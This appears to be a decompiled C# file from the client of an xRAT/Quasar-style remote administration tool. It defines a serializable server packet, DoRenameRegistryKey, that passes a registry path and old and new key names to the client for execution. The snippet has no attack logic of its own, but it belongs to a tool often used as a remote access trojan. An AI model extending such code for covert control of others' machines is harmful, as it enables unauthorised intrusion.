using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoRenameRegistryKey : GInterface4
{
	public string ParentPath { get; set; }

	public string OldKeyName { get; set; }

	public string NewKeyName { get; set; }

	public DoRenameRegistryKey(string parentPath, string oldKeyName, string newKeyName)
	{
		ParentPath = parentPath;
		OldKeyName = oldKeyName;
		NewKeyName = newKeyName;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
